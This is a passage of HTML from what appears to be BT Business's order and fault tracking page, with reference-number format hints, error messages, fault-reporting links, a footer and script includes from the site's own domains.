                                        <li data-reference="BOS">
                                            <span class="pattern">
                                                <p data-pattern="BOS12345678" class="rule">
                                                    BOS12345678
                                                </p>
                                                <p class="description">
                                                    Starts with BOS followed by eight numbers
                                                </p>
                                                <p class="error-message">
                                                </p>
                                            </span>
                                        </li>
                                        <li data-reference="BT">
                                            <span class="pattern">
                                                <p data-pattern="BTA12345" class="rule">
                                                    BTA12345678
                                                </p>
                                                <p class="description">
                                                    Starts with BT followed by six to nine characters
                                                </p>
                                                <p class="error-message">
                                                </p>
                                            </span>
                                        </li>
                                        <li data-reference="GBT">
                                            <span class="pattern">
                                                <p data-pattern="GBT12345" class="rule">
                                                    GBT1234567
                                                </p>
                                                <p class="description">
                                                    Starts with GBT followed by five to seven characters
                                                </p>
                                                <p class="error-message">
                                                </p>
                                            </span>
                                        </li>
                                        <li data-reference="ABC">
                                            <span class="pattern">
                                                <p data-pattern="ABC123AB" class="rule">
                                                    ABC123AB
                                                </p>
                                                <p class="description">
                                                    Three letters, three numbers and then two letters
                                                </p>
                                                <p class="error-message">
                                                </p>
                                            </span>
                                        </li>
                                        <li data-reference="PX" ng-show="IsOCSJourneyAllowed">
                                            <span class="pattern">
                                                <p data-pattern="PXIP123456" class="rule">
                                                    PXIP123456
                                                </p>
                                                <p class="description">Starts with PX followed by letters and numbers</p>
                                                <p class="error-message">
                                                </p>
                                            </span>
                                        </li>
                                    </ul>
                                </div>
                                <div id="trackReferenceResidential" class="hide">
                                    <div data-alert="" class="alert-box warning push--top">
                                        <!--<h5>Oops. Is this a residential order reference?</h5>
                                        <p>It looks like this is a gs order reference and not a business one.</p>-->
                                        <p>
                                            That looks like a <strong>residential</strong> order number rather than a <strong>
                                                business
                                            </strong> one.<br />
                                            <br />
                                            If you want to track a home order, click the button below.<br />
                                            <br />
                                            Otherwise, please make sure you've got a business reference and try again.
                                        </p>
                                    </div>
                                    <!--<p>Your current order reference is residential. If the order is correct click the button below to track it.</p>-->
                                    <a href="https://www.bt.com/appsconsumerordertracking/?s_intcid=btb_intlink_trackorderdetails_consumerorder"
                                       id="residentialbtnTrackOrder" class="button columns bg--blue-gradient text--white columns push--bottom push-half--top">
                                        I want to track a residential order
                                    </a>
                                </div>
                                <div id="trackReferenceRightNow" class="hide">
                                    <h5>
                                        12345-123456
                                    </h5>
                                    <p>
                                        Starts with 5 or 6 numbers, followed by 6 numbers
                                    </p>
                                    <div data-alert="" class="alert-box warning push--top">
                                        <p>
                                            It's a little bit too early to track your order yet. We are processing your online
                                            order and you'll shortly receive an email with an order number you can use to
                                            track your order here.
                                        </p>
                                    </div>
                                </div>
                                <div id="trackReferenceGlobalService" class="hide">
                                    <div data-alert="" class="alert-box warning push--top">
                                        <!--<h5>Oops. Is this a gs order reference?</h5>
                                        <p>It looks like this is a gs order reference and not a business one.</p>-->
                                        <p>
                                            We're sorry but you need to use a different order tracker for that reference.
                                        </p>
                                    </div>
                                    <!--<p>Your current order reference is global services. If the order is correct click the button below to track it.</p>-->
                                    <a href="http://ukb.globalservices.bt.com/OrderManagement/Online/OrderManagementIndex.aspx"
                                       id="gsbtnTrackOrder" class="button columns bg--blue-gradient text--white columns push--bottom push-half--top">
                                        Take me to the right order tracker
                                    </a>
                                </div>
                            </div>

                            <!-- Tooltip end -->

                        </label>



                        <!--Three times incorrect order ref -->
                        <div id="threeTimeIncorrectOrderRef" class="row flush--left" style="display: none;">
                            <div class="columns small-10 medium-6 alert-box secondary">
                                <p>
                                    We still haven't found this order.
                                </p>
                                <p class="flush--bottom">
                                    Maybe there's a problem with your order.
                                </p>
                            </div>
                            <div class="columns small-10 medium-6 billing-teaser">
                                <h3 class="flush--bottom">
                                    Do you have any queries?
                                </h3>
                                <!--Online-->
                                <div class="billing-teaser push--bottom" ng-if="InvalidChatStatus == 'Online'">
                                    <a data-omtrack="Bill Teaser" class="soft-half--top hard--right flush--right flush--bottom"
                                       chat-window-directive chatwindowurl="{{InvalidChatUrl}}" data-omchatload='{"i":12, "m":"Proactive chat:Order ref incorrect 3 times:Chat offered"}'
                                       data-omclick='{"m":"Proactive chat:Order ref incorrect 3 times:Chat accepted"}'>
                                        <span class="billing-teaser-icon columns small-3 medium-3 hard--bottom flush--bottom">
                                            <i class=" icon-chat soft-half--bottom "></i>
                                        </span>
                                        <h5 class="columns small-9 medium-9 hard--right flush--right">
                                            Chat online now
                                        </h5>
                                    </a>
                                </div>
                                <!-- Offline case-->
                                <div ng-if="InvalidChatStatus != 'Online'" class="billing-teaser bg-light-grey hard--sides soft-half--top chat-offline columns">
                                    <span class="billing-teaser-icon columns small-3 medium-3 hard--bottom flush--bottom">
                                        <i class=" icon-chat soft-half--bottom "></i>
                                    </span>
                                    <h5 class="columns small-9 medium-9 hard--right flush--right">
                                        Chat is offline
                                    </h5>
                                </div>
                            </div>
                        </div>
                        <!--Track Order Error Message -->
                        <div class="row flush--left">
                            <div id="incorrectOrderRef" data-alert class="alert-box alert" style="display: none;">
                                <h5>
                                    Sorry, we didn't recognise that order number.
                                </h5>
                                <p>
                                    Maybe there's a problem with your order. Try contacting support if you still can't
                                    track your order.
                                </p>
                            </div>
                        </div>
                        <!-- Order not found error -->
                        <div class="row flush--left">
                            <div id="orderNotFoundError" data-alert class="alert-box alert" style="display: none;">
                                <h5>
                                    Sorry, we didn't recognise that order number.
                                </h5>
                                <p>
                                    Maybe there's a problem with your order. Try contacting support if you still can't
                                    track your order.
                                </p>
                            </div>
                        </div>
                        <!-- partialOrder -->
                        <div class="row flush--left">
                            <div id="partialOrder" data-alert class="alert-box alert" style="display:none;background-color:#14AA37;border:#14AA37">
                                <p>We’ve got your order request and will be in touch soon to complete your order</p>
                            </div>
                        </div>

                        <div class="medium-4 columns postcode-box-mobile" ng-show="IsPostCodeEnabled" style="padding-left:5px;margin-left: -3px;width: 105%;">
                            <label>
                                Postcode
                                <input autocomplete="off" id="code-input" name="postCodeBox" type="text" data-ng-model="postCode" ng-keyup="OnPostCodeKeyEnter()" ng-blur="FormatPostCode(0)"
                                       ng-paste="onPostCodeChange()" ng-cut="onPostCodeChange()" maxlength="10" />

                            </label>
                        </div>

                        <input type="hidden" value=https://business.bt.com/online/track-your-projects/?f= id="OCSProjectRefAEMUrl" />
                        <input type="hidden" value=https://business.bt.com/order-tracker/order-tracker-summary?orn= id="AEMOrderTrackerBaseURL" />
                        <input type="hidden" id="hiddenOTReCaptchaToken" name="hiddenOTReCaptchaToken" />

                        <button name="trackReferenceButton" class="button button round " data-omclick='{"m":"Popular shortcuts - Track an order - Submit"}'
                                ng-disabled="orderTracker_form.$pristine
                                                || (orderTracker_form.trackReferenceBox.$error.validOrderFlag || (ShowPostCodeSwitch && IsPostCodeEnabled && (IsPostCodeValid == undefined || !IsPostCodeValid)))
                                                || trackOrderInProgress || false"
                                ng-click="onTrackOrderButtonClick($event, '6LcUOGQbAAAAAGRsv8w-6ygHKuKPP5QFSFQmtSL1', 'true')" type="submit" class="button bg--blue-gradient text--white push--bottom"
                                disabled="disabled">
                            Track order
                        </button>
                    </div>
                    <div class="medium-4 columns postcode-box" ng-show="IsPostCodeEnabled" style="float:left !important;padding-left: 5px;">
                        <label>
                            Postcode
                            <input autocomplete="off" id="code-input" name="postCodeBox" type="text" data-ng-model="postCode" ng-keyup="OnPostCodeKeyEnter()" ng-blur="FormatPostCode(0)" ng-paste="onPostCodeChange()"
                                   ng-cut="onPostCodeChange()" maxlength="10" />

                        </label>
                    </div>

                </div>
            </form>

            <!-- Order Tracker reCaptCha Validation Error -->
            <div class="row flush--left">
                <div id="OrderTrackerreCaptChaValidationError" data-alert class="alert-box alert" style="display: none;">
                    
                    <p>
                        Sorry, something went wrong. Maybe there's a problem with your order. Try contacting support if you still can't track your order.
                    </p>
                </div>
            </div>
        </div>
        <div id="cssOrderPopup" class="reveal-modal medium" data-reveal>
            <section class="push--ends" style="border: 3px solid #efefef;">
                <h5>
                    This is part of a larger order
                </h5>
                <p>
                    Click on the button below to track the parent order
                </p>
                <button class="button columns bg--blue-gradient text--white columns push--bottom push-half--top"
                        ng-click="redirectCSSTracker($event)">
                    Track parent order
                </button>
            </section>
        </div>
        <div id="GroupOrderFoundPopUp" class="reveal-modal" data-reveal>
            <section class="push--ends">
                <div class="row">
                    <div class="columns small-12 medium-12">
                        <a class="close-reveal-modal">&#215;</a>
                        <h3>
                            This is part of a group order
                        </h3>
                        <hr class="hr--pink">
                    </div>
                </div>
                <div class="row">
                    <div class="columns small-12 medium-3">
                        <h3>
                            Order
                        </h3>
                        <p id="ChildOrderID">
                            {{ChildOrderID}}
                        </p>
                        <a data-omtrack="Track Child Order" class="button bg--blue-gradient text--white push--bottom chevron "
                           style="width: 200px;" onclick='var scope = angular.element(" [ng-controller]:eq(1)").scope(); scope.redirectToChildOrderSummary();'>
                            Track Order
                        </a>
                    </div>
                    <div class="column small-12 medium-5">
                        <h3 class="hide-for-medium-up soft--top">
                            belongs to
                        </h3>
                        <h3 class="hide-for-small text--align--centre soft--top">
                            belongs to
                        </h3>
                    </div>
                    <div class="column small-12 medium-4">
                        <form>
                            <div class="row">
                                <div class="large-12 columns">
                                    <h3>
                                        Group order
                                    </h3>
                                    <p id="GroupOrderID">
                                        {{GroupOrderID}}
                                    </p>
                                    <a class="button bg--blue-gradient text--white push--bottom chevron " onclick='var scope = angular.element(" [ng-controller]:eq(1)").scope(); scope.trackGroupOrder(event);'
                                       data-omclick='{"m":"Popular shortcuts - Track group order"}'>Track group order</a>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </div>
        <!--popup container -->
        <div id="contactUsPopup" class="reveal-modal medium" data-reveal>
            <section class="push--ends">
                <div class="row">
                    <div class="columns small-12 medium-12">
                    </div>
                </div>
            </section>
        </div>
    </dd>
</dl>

                        <!-- Row 1 END -->
                        <!-- Row 3 -->
<dl class="accordion" data-accordion="C030-further-info-item" ng-expand-scroll-here-when="tabid == 4">
    <dd class="accordion-navigation">
        <a data-omclick='{"m":"Popular shortcuts - Track a fault - Expand"}' href="#further-info-two-" class="notifications-section-heading">
            Track a fault <span class="icon-wrapper"><i class=" icon-arrow-down "></i></span>
        </a>
        <div id="further-info-two-" class="content notifications-rows" ng-controller="FaultTrackerController">
            <form id="orderTrackerFault" name="faultTracker_form" novalidate="novalidate">
                <div class="row">
                    <div class="medium-4 columns">
                        <label>
                            Enter your fault reference, service ID or phone number
                            <input id="txtFaultTracker" name="txtFaultTracker" spellcheck="false" autocomplete="off"
                                   type="text" data-options="align:left" ng-model="faultTracker.TrackNumber" ng-blur="rectifyValue()"
                                   maxlength="19" />
                            <!-- Start:Tooltip Hidden for mobile -->
                            <div id="trackReferenceHint" class="tooltip-faults" style="display: none;">
                                <p class="soft--top">
                                    Your fault reference number will look like one of these:
                                </p>
                                <span class="pattern" id="Fault1">
                                    <p class="rule">VOL012-12345678901</p>
                                    <p class="description">
                                        Starts with VOL followed by three numbers, a dash and eleven numbers
                                    </p>
                                </span>
                                <span class="pattern" id="Fault2">
                                    <p class="rule">1-123456789</p>
                                    <p class="description">
                                        Starts with one number followed by a dash and nine numbers
                                    </p>
                                </span>
                                <span class="pattern" id="Fault4">
                                    <p class="rule">RY0AAJ54/RY0AAJ54A</p>
                                    <p class="description">Starts with two letters followed by six or seven alphanumeric.</p>
                                </span>
                                <p>
                                    You can also track a fault using a phone number or service ID like these:
                                </p>
                                <span class="pattern" id="Fault3">
                                    <p class="rule">01211234567</p>
                                    <p class="description">
                                        Starts with area code, with no gaps
                                    </p>
                                </span>
                                <span class="pattern" id="Fault8">
                                    <p class="rule">07123456789</p>
                                    <p class="description">
                                        Starts with 07, followed by nine numbers and no gaps
                                    </p>
                                </span>
                                
                                <span class="pattern" id="Fault5">
                                    <p class="rule">CV12345678</p>
                                    <p class="description">
                                        Starts with CV followed by eight or nine numbers
                                    </p>
                                </span>
                                <span class="pattern" id="Fault6">
                                    <p class="rule">FBWM1234567</p>
                                    <p class="description">
                                        Starts with FB followed by two letters and seven numbers
                                    </p>
                                </span>
                                <span class="pattern noborder" id="Fault7">
                                    <p class="rule">06212345678</p>
                                    <p class="description">
                                        Starts with 062, followed by eight numbers and no gaps
                                    </p>
                                </span>
                            </div>
                            <!-- End:Tooltip -->
                        </label>
                        <div data-alert="" ng-show="faultTracker.showError" class="alert-box alert">
                            The Phone/Broadband/Fault Reference Number you have entered is invalid, please try
                            again.
                        </div>
                        <button id="btnFaultTracker" ng-disabled="disableButton" type="submit" class="button button round "
                                ng-click="TrackFault();" data-omclick='{"m":"Popular shortcuts - Track a fault  - Submit"}'>
                            Track fault
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </dd>
</dl>

                        <!-- Row 3 END-->
                        <!-- Row 4 -->
        <dl class="accordion" data-accordion="C030-further-info-item" ng-expand-for-furl="tabid=4">
            <dd class="accordion-navigation">
                <a data-omclick='{"m":"Popular shortcuts - Report a fault - Expand"}' href="#further-info-three-" class="notifications-section-heading">
                    Report a fault <span class="icon-wrapper"><i class="icon-arrow-down "></i></span>
                </a>
                <div id="further-info-three-" class="content notifications-rows">
                    <div class="row report-fault">
                        <div class="columns small-12 medium-3">
                            <i class="icon-voip icon-bubble"></i><a href="/faultmanagement/online/FaultReport.aspx?faultType=Business PSTN Service" class="chevron-btn link" data-omclick='{"m":"Popular shortcuts - Report a fault - Phone fault"}'>
                                Phone fault
                            </a>
                        </div>
                        <div class="columns small-12 medium-3">
                            <i class="icon-network-services icon-bubble"></i><a href="/faultmanagement/online/FaultReport.aspx?faultType=Broadband" class="chevron-btn link"
                                                                                data-omclick='{"m":"Popular shortcuts - Report a fault - Broadband fault"}'>Broadband fault</a>
                        </div>
                        <div class="columns small-12 medium-3">
                            <i class="icon-mail icon-bubble"></i><a href="/faultmanagement/online/FaultReport.aspx?faultType=Broadband&fromPage=Email" class="chevron-btn link" data-omclick='{"m":"Popular shortcuts - Report a fault - Email fault"}'>
                                Email fault
                            </a>
                        </div>
                        <div class="columns small-12 medium-3">
                            <i class="icon-voip icon-bubble"></i><a href="/faultmanagement/online/FaultReport.aspx?faultType=BTCV Service" class="chevron-btn link" data-omclick='{"m":"Popular shortcuts - Report a fault - Business Cloud voice fault"}'>
                                BT Cloud Voice fault
                            </a>
                        </div>
                    </div>
                    <!-- </form> Containing form for delete -->
                </div>
            </dd>
        </dl>



                        <!-- Row 4 END-->
                    </li>
                </ul>
            </div>
            <!-- Links -->
            <div class="columns small-12 medium-12 bill-links">
                <a href="https://portal.microsoftonline.com/" data-omclick='{"m":"Popular shortcuts - Email login"}'>
                    Email login
                </a>
            </div>
            <div class="columns small-12 medium-12 bill-links">
                <a href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html" data-omclick='{"m":"Popular shortcuts - Pay a bill by card"}'>
                    Pay a bill by card
                </a>
            </div>
            <!-- Links END -->
        </div>
    </div>
</section>
<div id="myModal" class="reveal-modal" data-reveal aria-labelledby="modalTitle" aria-hidden="true"
     role="dialog">
    <h2 id="modalTitle">
        Additional accounts detected.
    </h2>
    <p class="lead">
        We have detected additional accounts have been added since you last viewed your
        Faults and Orders dashboard. In order to view the dashboard you will need to add
        the new account(s) in My Permissions.Go to My permissions
    </p>
    <p>
        ******7257
    </p>
    <p>
        Don't worry, if you don't have the details of these accounts you can still track
        a fault or order with your fault or order references. If you add all your accounts
        later the dashboard view will be restored.
    </p>
    <a class="close-reveal-modal" aria-label="Close">&#215;</a>
</div>

</div>

    </div>

    <!-- C011 footer --> 
<!-- wrapper for the section -->
<footer role="contentinfo" id="global-footer" class="global-footer section">
    <div>
        <div class="bottom-nav multifield">
            <div class="cmp-bottom-nav full-width">
                <div class="row ">
                    <div class="medium-12 columns">

                        <ul class="bottomnav">
                            <li><a href="https://business.bt.com/help/contact-us-business/">Contact BT</a></li>
                            <li><a href="https://business.bt.com/site-map/">Sitemap</a></li>
                            <li><a href="http://business.bt.com/business/terms-of-use/">Terms of use</a></li>
                            <li><a href="https://www.bt.com/about/bt/policy-and-regulation/our-governance-and-strategy/codes-of-practice">Code of practice</a></li>
                            <li class="soft-half--sides mobile-hard--left"><a class="roll--underline" href="https://www.bt.com/privacy-policy">Privacy policy</a></li>
                            <li class="soft-half--sides mobile-hard--left"><a class="roll--underline" href="https://www.bt.com/about/accessibility">Accessibility</a></li>
                            <li><a href="https://www.bt.com/about/bt/policy-and-regulation/our-governance-and-strategy/codes-of-practice/customer-complaints-code">Customer complaint code</a></li>

                        </ul>

                    </div> 

                </div>
            </div>
        </div>
    </div>
</footer>


    <!--[if lte IE 8]>
      <script src="https://secure.business.bt.com/Content/Hub/assets/js/bt-legacy.js"></script>
      <script type="text/javascript" src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
    <![endif]-->
    <script src="https://secure.business.bt.com/Content/Hub/assets/cookie-toolbar/js/cookies.js?v=20211002.221709-bst"></script>

    <!--[if lte IE 8]>
        <script type="text/javascript" src="https://btbsecure.business.bt.com/CommonContent/v2/js/jquery-legacy.js"></script>
      <script type="text/javascript" src="https://secure.business.bt.com/Content/Hub/assets/js/bt-legacy.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
    <![endif]-->
    
    <script src="https://secure.business.bt.com/Scripts/Vendors/Common/jquery-ui.js"></script>
    <script src="https://secure.business.bt.com/Bundles/Angular?v=Zf9-wHFdtyzfNWEcDGh-IWImk8-6BJ_Dl9GmccgirLQ1"></script>

    <script src="https://secure.business.bt.com/Content/Common/assets/js/formBuilder.js?v=20211002.221709-bst"></script>
    <script src="https://secure.business.bt.com/Content/Common/assets/js/respond.min.js?v=20211002.221709-bst"></script>
    <script type='text/javascript'>window.ATGSvcs = { 'eeid': 200106306529 };</script>
    <script src="https://secure.business.bt.com/Scripts/Vendors/nprogress.js?v=20211002.221709-bst"></script>
    <script src="https://secure.business.bt.com/Bundles/OmnitureScripts?v=asLQu0VqC5JxXdYX_I8Ne3vbqxRfwgFomPKg4qm-KDo1"></script>

    <script src="https://secure.business.bt.com/Bundles/HubScripts?v=7pMs-IglUaFtUXbj9t6bLV_1OLI_UclL-79egwfVYTI1"></script>


    <script type="text/javascript">if (typeof _satellite != 'undefined') { _satellite.pageBottom(); }</script>
</body>
</html>
